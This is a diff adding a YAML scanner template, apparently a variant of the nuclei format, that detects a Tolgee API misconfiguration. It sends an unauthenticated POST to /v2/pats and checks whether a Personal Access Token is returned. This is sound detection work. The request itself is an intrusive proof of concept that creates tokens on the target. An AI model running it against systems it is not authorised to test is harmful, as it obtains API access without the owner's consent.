@@ -1,0 +1,34 @@
+id: tolgee-api-anonymous
+brief:
+    title: Tolgee API - Misconfiguration Anonymous Access
+    by: matejsmycka
+    level: medium
+    about: The Tolgee API exposes the `/v2/pats` endpoint without requiring authentication, allowing attackers to create Personal Access Tokens (PATs). These tokens can then be leveraged to interact with the ...
+    label:
+        - api
+        - tolgee
+        - misconfig
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/v2/pats'
+      head:
+        Accept-Encoding: gzip
+      body: '{"description":"{{string}}"}'
+      signs:
+        - "on": word
+          has:
+            - '{"token":'
+            - '"createdAt"'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/hal+json
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 201
